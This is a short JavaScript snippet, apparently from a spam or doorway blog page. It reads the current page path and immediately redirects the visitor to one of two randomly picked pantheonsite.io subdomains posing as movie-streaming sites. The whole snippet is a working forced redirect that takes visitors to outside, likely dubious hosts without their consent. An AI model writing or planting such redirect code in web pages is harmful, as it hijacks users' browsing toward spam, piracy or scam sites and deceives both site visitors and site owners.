var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [
"https://dev-boxofficefilom24.pantheonsite.io/moviesstreaming",
"https://dev-hdfilm21.pantheonsite.io/eanakirakiar"
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
